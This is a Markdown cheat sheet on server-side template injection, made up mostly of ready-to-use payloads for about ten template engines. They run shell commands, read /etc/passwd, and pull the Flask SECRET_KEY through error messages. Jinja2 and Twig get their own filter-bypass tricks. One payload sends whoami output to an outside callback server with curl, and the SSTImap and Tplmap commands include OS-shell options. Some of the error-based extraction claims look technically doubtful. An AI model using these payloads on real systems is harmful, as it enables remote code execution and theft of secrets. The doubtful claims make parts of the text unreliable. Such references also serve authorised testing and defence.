---
tags:
  - critical
  - server-side
---

# Server-Side Template Injection (SSTI)

## TL;DR

Inject template syntax to execute code on the server.

```python
{{7*7}}     →  49 (Jinja2/Twig)
${7*7}      →  49 (Freemarker)
<%= 7*7 %>  →  49 (ERB)
```

## Detection

### Universal Fuzzing

```
${{<%[%'"}}%\
```

### By Engine

| Payload | Engine(s) |
|---------|-----------|
| `{{7*7}}` | Jinja2, Twig, Nunjucks |
| `${7*7}` | Freemarker, Velocity, Thymeleaf |
| `<%= 7*7 %>` | ERB (Ruby), EJS |
| `#{7*7}` | Thymeleaf, Slim |
| `{7*7}` | Smarty |
| `@(7*7)` | Razor (.NET) |

## Jinja2 (Python/Flask)

### Detection

```python
{{7*'7'}}  →  7777777
{{config}}
```

### RCE

```python
# Via subclasses
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}

# Generic
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}

# File read
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Bypasses

```python
# Without dots
{{request|attr("__class__")}}
{{request["__class__"]}}
```

## Twig (PHP)

### RCE

```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Using filter
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

## Smarty (PHP)

```php
{$smarty.version}
{system('ls')}
{system('cat /etc/passwd')}
```

## Freemarker (Java)

### RCE

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Alternative
${"freemarker.template.utility.Execute"?new()("id")}
```

## Velocity (Java)

```java
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("id"))
$process.getInputStream()
```

## Thymeleaf (Java)

```java
${T(java.lang.Runtime).getRuntime().exec('id')}

# Expression inlining
[[${7*7}]]

# Preprocessing
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

## ERB (Ruby)

```ruby
<%= system("id") %>
<%= `id` %>
<%= File.open('/etc/passwd').read %>
```

## Pug/Jade (Node.js)

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

## Nunjucks (Node.js)

```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

## Razor (.NET)

```csharp
@(2+2)
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
```

## Error-Based Blind SSTI (2025 Technique)

**Source:** "Successful Errors: New Code Injection and SSTI Techniques" by Vladislav Korchagin — PortSwigger Top 10 2025 #1. Adapted old SQL injection error-based techniques for template engines.

**Core insight:** Trigger controlled errors that **reveal** execution results, bypassing the need for output reflection.

### Polyglot Detection

When you can't tell which engine, use error fingerprinting:

```
# The payload causes engine-specific errors
{{7*'7'}}[[3*3]]<%= 7*7 %>${{3*3}}#{3*3}*{3*3}
# Each engine breaks differently → fingerprint via error message
```

**Error-based fingerprinting workflow:**
```bash
# Send to Jinja2
{{undefined_var}}
# Error: "jinja2.exceptions.UndefinedError: 'undefined_var' is undefined"

# Send to Twig
{{undefined_var}}
# Error: "Variable "undefined_var" does not exist."

# Send to ERB  
<%= undefined_var %>
# Error: "undefined local variable or method `undefined_var'"
```

### Error-Based Data Extraction (Jinja2)

```python
# Traditional: need output reflection
{{ config }}  # Output: <Config {'KEY': 'value'}>

# Error-based: trigger error containing data
{{ ''.__class__.__mro__[2].__subclasses__()[42]('/etc/passwd').read()[:50] + undefined }}
# Error message contains the first 50 chars of /etc/passwd!

# Extraction via exception
{% set x = config['SECRET_KEY'] %}{% if x %}{{ x + undefined }}{% endif %}
# If SECRET_KEY exists → error contains its value

# Numeric extraction via type errors  
{{ config['SECRET_KEY'][0:1] * 10000000000000 }}
# Triggers integer overflow → error reveals character
```

### Blind RCE Confirmation (Out-of-Band)

```python
# Can't see output but want RCE confirmation
# Use OOB callback (works with CallMeBack)
{{ self.__init__.__globals__.__builtins__.__import__('os').system('curl https://your-server.com/$(whoami)') }}

# Or via subprocess
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output(['id']).decode() + undefined }}
# Error contains command output!
```

### SSTImap Updated Usage

```bash
# SSTImap now includes error-based techniques
python3 sstimap.py -u "http://target/?name=test" --technique error

# Blind injection (no output in response)
python3 sstimap.py -u "http://target/?name=test" --os-cmd "id" --technique oob \
  --callback-url https://your-server.com/
```

## Tools

```bash
# SSTImap (updated with error-based techniques)
python3 sstimap.py -u "http://target/?name=test"

# TInjA
tinja url -u "http://target/?name=test"

# Tplmap
python2.7 tplmap.py -u 'http://target/?name=test*' --os-shell
```

## Quick Reference

| Engine | Language | Syntax | Detection |
|--------|----------|--------|-----------|
| Jinja2 | Python | `{{...}}` | `{{config}}` |
| Twig | PHP | `{{...}}` | `{{dump(app)}}` |
| Smarty | PHP | `{...}` | `{$smarty.version}` |
| Freemarker | Java | `${...}` | `${7*7}` |
| Thymeleaf | Java | `${...}` | `${T(java.lang.Math).random()}` |
| ERB | Ruby | `<%= ... %>` | `<%= 7*7 %>` |
| Nunjucks | Node.js | `{{...}}` | `{{7*7}}` |
| Razor | .NET | `@(...)` | `@(2+2)` |
